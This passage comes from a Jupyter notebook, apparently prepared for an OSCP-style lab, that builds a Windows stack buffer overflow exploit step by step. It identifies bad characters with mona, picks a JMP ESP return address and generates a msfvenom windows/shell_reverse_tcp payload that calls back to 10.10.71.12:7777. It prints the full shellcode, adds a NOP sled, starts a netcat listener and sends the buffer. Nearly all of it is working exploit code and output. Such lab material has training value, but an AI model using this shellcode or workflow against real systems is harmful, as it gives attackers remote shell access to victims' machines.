      " ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ\n"
     ]
    }
   ],
   "source": [
    "bytearray_value = get_goodchars()\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a2b9c7d-cbd7-4922-a054-d19f824c0cc5",
   "metadata": {},
   "source": [
    "## Repeat from here!\n",
    "### Run and note ESP location:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "c85bdc65-c759-4851-953a-b7079152fbeb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(bytearray_value, offset=offset, retn=\"BBBB\", prefix=prefix)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd13b075-e92b-4e27-8a61-42a5ab2e8695",
   "metadata": {},
   "source": [
    "Get ESP Address"
   ]
  },
  {
   "cell_type": "raw",
   "id": "5bd9c4e6-4699-4385-8f21-b9e516ed8584",
   "metadata": {},
   "source": [
    "Note: ESP Location:\n",
    "0190FA30"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "id": "bcdf0b0b-b09b-426b-9357-c70ff3eb6c10",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zsh:1: command not found: mona\n"
     ]
    }
   ],
   "source": [
    "!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 0198FA30"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9f296cb-6b12-44e1-a49a-6cd1b3334502",
   "metadata": {},
   "source": [
    "^ Crashing immunity appears to be a successful result...\n",
    "\n",
    "Find characters that are not equal:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "bd865271-82c8-485c-b17b-86456219cca6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\\\x00\\\\x11\\\\x40\\\\x5f\\\\xb8\\\\xee'"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "raw_string = \"00 a0 a1 ad ae be bf de df ef f0\"\n",
    "\n",
    "split_string = raw_string.split(\" \")\n",
    "final_string = []\n",
    "for i in range(1, len(split_string)):\n",
    "    if not int(split_string[i], 16) == int(split_string[i-1], 16) + 1:\n",
    "        final_string.append(split_string[i])\n",
    "badchars_full = \"\\\\x\"+\"\\\\x\".join(split_string)\n",
    "badchars_auto = \"\\\\x00\\\\x\"+\"\\\\x\".join(final_string)\n",
    "badchars_auto"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6912ef5-f2ba-410e-bd4d-08e27dcf4154",
   "metadata": {},
   "source": [
    "NOTE: If you remove one and it comes back, keep it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5210bff9-987b-4585-b459-5cbc9922384b",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(badchars_full)\n",
    "keepme=\"\"\n",
    "badchars=badchars+keepme"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "c8ecb739-e1f5-4d37-8762-e4cab12ba9e8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona bytearray -b \"\\x00\\x11\\x40\\x5f\\xb8\\xee\"\n"
     ]
    }
   ],
   "source": [
    "# \"\\x00<OTHER BAD_CHARS>\"\n",
    "# Remmeber back to back badchars might not be bad chars! Don't remove secon ones in sequence\n",
    "# 00 11 12 40 41 5f 60 b8 b9 ee ef\n",
    "badchars = badchars_auto\n",
    "print(\"!mona bytearray -b\", '\"%s\"' % badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9382c18-37a9-45dd-a727-a52723fcdb14",
   "metadata": {},
   "outputs": [],
   "source": [
    "bytearray_value = get_goodchars(badchars)\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4bc253db-593f-445c-9aff-cc7eaa377cc0",
   "metadata": {},
   "source": [
    "### Repeat!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b5d93862-4a17-479a-b9b6-6c81a88da3e5",
   "metadata": {},
   "source": [
    "# Find Jump Point:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f16e0545-423c-4e47-a94d-49cdc065d061",
   "metadata": {},
   "source": [
    "### Make sure to run while program is running or crashed:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "id": "1433f847-06fd-4fe3-8836-1e356d16dba0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona jmp -r esp -cpb \"\\x00\\x11\\x40\\x5f\\xb8\\xee\"\n"
     ]
    }
   ],
   "source": [
    "print(\"!mona jmp -r esp -cpb\", '\"%s\"' % badchars)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "374180e6-8881-4798-a4a2-7b115c6ddbd1",
   "metadata": {},
   "source": [
    "### Pick a jump point and record it:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "ea2272ca-0735-43af-90cd-e22b9b0c9ca6",
   "metadata": {},
   "source": [
    "Address:\n",
    "\n",
    "62501203\n",
    "62 50 12 03"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "id": "904e68a2-2f9c-4e67-8224-ce77a6a26eaa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bP\u0012\u0003 , \u0003\u0012Pb\n"
     ]
    }
   ],
   "source": [
    "jump_forwards = \"\\x62\\x50\\x12\\x03\"\n",
    "jump_backwards = \"\".join(list(reversed(jump_forwards))) # Little endian\n",
    "\n",
    "print(jump_forwards,\",\",jump_backwards)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "992c60b2-e850-4c55-8452-0364c3b95c87",
   "metadata": {},
   "outputs": [],
   "source": [
    "final_retn = jump_backwards"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90e67328-c56d-4139-aa1a-7543238682cc",
   "metadata": {},
   "source": [
    "# Generate Payload:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "e8243ecc-8a9b-4169-9434-82a6b940635c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n",
      "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000\n",
      "    link/ether 02:10:ba:29:6f:dd brd ff:ff:ff:ff:ff:ff\n",
      "    inet 10.10.71.12/16 brd 10.10.255.255 scope global dynamic eth0\n",
      "       valid_lft 2105sec preferred_lft 2105sec\n",
      "    inet6 fe80::10:baff:fe29:6fdd/64 scope link \n"
     ]
    }
   ],
   "source": [
    "!ip a | grep 10."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "id": "f8e58f58-b309-490b-83c6-4f0125503cfc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: LHOST=10.10.71.12\n"
     ]
    }
   ],
   "source": [
    "%env LHOST=10.10.71.12"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "4b8a7e49-e309-4458-8eed-178c0af36166",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "add to -b below\n",
      "\\x00\\x11\\x40\\x5f\\xb8\\xee\n"
     ]
    }
   ],
   "source": [
    "print(\"add to -b below\")\n",
    "print(badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "3173552a-ae2a-40e4-a066-bca8c01ab7d9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n",
      "[-] No arch selected, selecting arch: x86 from the payload\n",
      "Found 11 compatible encoders\n",
      "Attempting to encode payload with 1 iterations of x86/shikata_ga_nai\n",
      "x86/shikata_ga_nai failed with A valid opcode permutation could not be found.\n",
      "Attempting to encode payload with 1 iterations of generic/none\n",
      "generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)\n",
      "Attempting to encode payload with 1 iterations of x86/call4_dword_xor\n",
      "x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)\n",
      "Attempting to encode payload with 1 iterations of x86/countdown\n",
      "x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11)\n",
      "Attempting to encode payload with 1 iterations of x86/fnstenv_mov\n",
      "x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)\n",
      "Attempting to encode payload with 1 iterations of x86/jmp_call_additive\n",
      "x86/jmp_call_additive succeeded with size 353 (iteration=0)\n",
      "x86/jmp_call_additive chosen with final size 353\n",
      "Payload size: 353 bytes\n",
      "Final size of c file: 1508 bytes\n",
      "unsigned char buf[] = \n",
      "\"\\xfc\\xbb\\xe7\\x62\\x19\\x36\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\"\n",
      "\"\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x1b\\x8a\\x9b\\x36\\xe3\"\n",
      "\"\\x4b\\xfc\\xbf\\x06\\x7a\\x3c\\xdb\\x43\\x2d\\x8c\\xaf\\x01\\xc2\\x67\\xfd\"\n",
      "\"\\xb1\\x51\\x05\\x2a\\xb6\\xd2\\xa0\\x0c\\xf9\\xe3\\x99\\x6d\\x98\\x67\\xe0\"\n",
      "\"\\xa1\\x7a\\x59\\x2b\\xb4\\x7b\\x9e\\x56\\x35\\x29\\x77\\x1c\\xe8\\xdd\\xfc\"\n",
      "\"\\x68\\x31\\x56\\x4e\\x7c\\x31\\x8b\\x07\\x7f\\x10\\x1a\\x13\\x26\\xb2\\x9d\"\n",
      "\"\\xf0\\x52\\xfb\\x85\\x15\\x5e\\xb5\\x3e\\xed\\x14\\x44\\x96\\x3f\\xd4\\xeb\"\n",
      "\"\\xd7\\x8f\\x27\\xf5\\x10\\x37\\xd8\\x80\\x68\\x4b\\x65\\x93\\xaf\\x31\\xb1\"\n",
      "\"\\x16\\x2b\\x91\\x32\\x80\\x97\\x23\\x96\\x57\\x5c\\x2f\\x53\\x13\\x3a\\x2c\"\n",
      "\"\\x62\\xf0\\x31\\x48\\xef\\xf7\\x95\\xd8\\xab\\xd3\\x31\\x80\\x68\\x7d\\x60\"\n",
      "\"\\x6c\\xde\\x82\\x72\\xcf\\xbf\\x26\\xf9\\xe2\\xd4\\x5a\\xa0\\x6a\\x18\\x57\"\n",
      "\"\\x5a\\x6b\\x36\\xe0\\x29\\x59\\x99\\x5a\\xa5\\xd1\\x52\\x45\\x32\\x15\\x49\"\n",
      "\"\\x31\\xac\\xe8\\x72\\x42\\xe5\\x2e\\x26\\x12\\x9d\\x87\\x47\\xf9\\x5d\\x27\"\n",
      "\"\\x92\\xae\\x0d\\x87\\x4d\\x0f\\xfd\\x67\\x3e\\xe7\\x17\\x68\\x61\\x17\\x18\"\n",
      "\"\\xa2\\x0a\\xb2\\xe3\\x25\\x3f\\x49\\xac\\xb9\\x57\\x4f\\x32\\xdc\\xc6\\xc6\"\n",
      "\"\\xd4\\x8a\\x18\\x8f\\x4f\\x23\\x80\\x8a\\x1b\\xd2\\x4d\\x01\\x66\\xd4\\xc6\"\n",
      "\"\\xa6\\x97\\x9b\\x2e\\xc2\\x8b\\x4c\\xdf\\x99\\xf1\\xdb\\xe0\\x37\\x9d\\x80\"\n",
      "\"\\x73\\xdc\\x5d\\xce\\x6f\\x4b\\x0a\\x87\\x5e\\x82\\xde\\x35\\xf8\\x3c\\xfc\"\n",
      "\"\\xc7\\x9c\\x07\\x44\\x1c\\x5d\\x89\\x45\\xd1\\xd9\\xad\\x55\\x2f\\xe1\\xe9\"\n",
      "\"\\x01\\xff\\xb4\\xa7\\xff\\xb9\\x6e\\x06\\xa9\\x13\\xdc\\xc0\\x3d\\xe5\\x2e\"\n",
      "\"\\xd3\\x3b\\xea\\x7a\\xa5\\xa3\\x5b\\xd3\\xf0\\xdc\\x54\\xb3\\xf4\\xa5\\x88\"\n",
      "\"\\x23\\xfa\\x7c\\x09\\x43\\x19\\x54\\x64\\xec\\x84\\x3d\\xc5\\x71\\x37\\xe8\"\n",
      "\"\\x0a\\x8c\\xb4\\x18\\xf3\\x6b\\xa4\\x69\\xf6\\x30\\x62\\x82\\x8a\\x29\\x07\"\n",
      "\"\\xa4\\x39\\x49\\x02\\xa4\\xbd\\xb5\\xad\";\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "!msfvenom -p windows/shell_reverse_tcp LHOST={os.environ[\"LHOST\"]} LPORT=7777 EXITFUNC=thread -b \"\\x00\\x11\\x40\\x5f\\xb8\\xee\" -f c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "13d5f6f3-5311-423a-94da-3ecba0e2502c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "M\u000fýg>ç\u0017ha\u0017\u0018¢\u0001Ã",
      "Àu÷Ãèïÿÿÿ\u001b6ãKü¿\u0006z<ÛC-¯\u0001Âgý±Q\u0005*¶Ò \f",
      "ùãmgà¡zY+´{V5)w\u001c",
      "èÝüh1VN|1\u0007\u0010\u001a\u0013&²ðRû",
      "\u0015^µ>í\u0014D?Ôë×'õ\u00107ØhKe¯1±\u0016+2#W\\/S\u0013:,bð1Hï÷Ø«Ó1h}`lÞrÏ¿&ùâÔZ j\u0018WZk6à)YZ¥ÑRE2\u0015I1¬èrBå.&\u0012Gù]'®\n",
      "²ã%?I¬¹WO2ÜÆÆÔ\u0018O#\u001bÒM\u0001fÔÆ¦.ÂLßñÛà7sÜ]ÎoK\n",
      "^Þ5ø<üÇ\u0007D\u001c",
      "]EÑÙ­U/áé\u0001ÿ´§ÿ¹n\u0006©\u0013ÜÀ=å.Ó;êz¥£[ÓðÜT³ô¥#ú|\tC\u0019Tdì=Åq7è\n",
      "´\u0018ók¤iö0b)\u0007¤9I\u0002¤½µ­\n"
     ]
    }
   ],
   "source": [
    "final_payload = (\"\\xfc\\xbb\\xe7\\x62\\x19\\x36\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\"\n",
    "\"\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x1b\\x8a\\x9b\\x36\\xe3\"\n",
    "\"\\x4b\\xfc\\xbf\\x06\\x7a\\x3c\\xdb\\x43\\x2d\\x8c\\xaf\\x01\\xc2\\x67\\xfd\"\n",
    "\"\\xb1\\x51\\x05\\x2a\\xb6\\xd2\\xa0\\x0c\\xf9\\xe3\\x99\\x6d\\x98\\x67\\xe0\"\n",
    "\"\\xa1\\x7a\\x59\\x2b\\xb4\\x7b\\x9e\\x56\\x35\\x29\\x77\\x1c\\xe8\\xdd\\xfc\"\n",
    "\"\\x68\\x31\\x56\\x4e\\x7c\\x31\\x8b\\x07\\x7f\\x10\\x1a\\x13\\x26\\xb2\\x9d\"\n",
    "\"\\xf0\\x52\\xfb\\x85\\x15\\x5e\\xb5\\x3e\\xed\\x14\\x44\\x96\\x3f\\xd4\\xeb\"\n",
    "\"\\xd7\\x8f\\x27\\xf5\\x10\\x37\\xd8\\x80\\x68\\x4b\\x65\\x93\\xaf\\x31\\xb1\"\n",
    "\"\\x16\\x2b\\x91\\x32\\x80\\x97\\x23\\x96\\x57\\x5c\\x2f\\x53\\x13\\x3a\\x2c\"\n",
    "\"\\x62\\xf0\\x31\\x48\\xef\\xf7\\x95\\xd8\\xab\\xd3\\x31\\x80\\x68\\x7d\\x60\"\n",
    "\"\\x6c\\xde\\x82\\x72\\xcf\\xbf\\x26\\xf9\\xe2\\xd4\\x5a\\xa0\\x6a\\x18\\x57\"\n",
    "\"\\x5a\\x6b\\x36\\xe0\\x29\\x59\\x99\\x5a\\xa5\\xd1\\x52\\x45\\x32\\x15\\x49\"\n",
    "\"\\x31\\xac\\xe8\\x72\\x42\\xe5\\x2e\\x26\\x12\\x9d\\x87\\x47\\xf9\\x5d\\x27\"\n",
    "\"\\x92\\xae\\x0d\\x87\\x4d\\x0f\\xfd\\x67\\x3e\\xe7\\x17\\x68\\x61\\x17\\x18\"\n",
    "\"\\xa2\\x0a\\xb2\\xe3\\x25\\x3f\\x49\\xac\\xb9\\x57\\x4f\\x32\\xdc\\xc6\\xc6\"\n",
    "\"\\xd4\\x8a\\x18\\x8f\\x4f\\x23\\x80\\x8a\\x1b\\xd2\\x4d\\x01\\x66\\xd4\\xc6\"\n",
    "\"\\xa6\\x97\\x9b\\x2e\\xc2\\x8b\\x4c\\xdf\\x99\\xf1\\xdb\\xe0\\x37\\x9d\\x80\"\n",
    "\"\\x73\\xdc\\x5d\\xce\\x6f\\x4b\\x0a\\x87\\x5e\\x82\\xde\\x35\\xf8\\x3c\\xfc\"\n",
    "\"\\xc7\\x9c\\x07\\x44\\x1c\\x5d\\x89\\x45\\xd1\\xd9\\xad\\x55\\x2f\\xe1\\xe9\"\n",
    "\"\\x01\\xff\\xb4\\xa7\\xff\\xb9\\x6e\\x06\\xa9\\x13\\xdc\\xc0\\x3d\\xe5\\x2e\"\n",
    "\"\\xd3\\x3b\\xea\\x7a\\xa5\\xa3\\x5b\\xd3\\xf0\\xdc\\x54\\xb3\\xf4\\xa5\\x88\"\n",
    "\"\\x23\\xfa\\x7c\\x09\\x43\\x19\\x54\\x64\\xec\\x84\\x3d\\xc5\\x71\\x37\\xe8\"\n",
    "\"\\x0a\\x8c\\xb4\\x18\\xf3\\x6b\\xa4\\x69\\xf6\\x30\\x62\\x82\\x8a\\x29\\x07\"\n",
    "\"\\xa4\\x39\\x49\\x02\\xa4\\xbd\\xb5\\xad\")\n",
    "\n",
    "print(final_payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6bc3aded-959e-4790-b6b1-1008e59e53fa",
   "metadata": {},
   "source": [
    "# Add Padding:\n",
    "\n",
    "This gives the exploit room to unpack itself"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "fc5660a6-bf1f-4f0b-880c-33fbf8e99681",
   "metadata": {},
   "outputs": [],
   "source": [
    "padding = \"\\x90\" * 16"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b8a4c36c-b830-4de4-b2aa-b04f7b5bf131",
   "metadata": {},
   "source": [
    "# Run Exploit:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "10e36d28-a8cd-4499-abb6-70efb67ce4cb",
   "metadata": {},
   "source": [
    "Run Netcat:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "332f8dd7-10fc-406c-80aa-99059beb1758",
   "metadata": {},
   "source": [
    "nc -lvnp 7777"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "5ae61a41-fd4f-472f-8331-9781ab1ded19",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(final_payload, offset=offset, retn=final_retn, padding=padding, prefix=prefix)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "id": "e42460be-ce92-459a-b69e-37617fd7a56a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1274"
      ]
     },
     "execution_count": 85,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "offset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "id": "6bd3d0cb-6472-4b27-a545-453e8c657847",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\x00\\x11\\x40\\x5f\\xb8\\xee\n"
     ]
    }
   ],
   "source": [
    "print(badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f008f82c-93c3-4146-81a1-c197836b533f",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
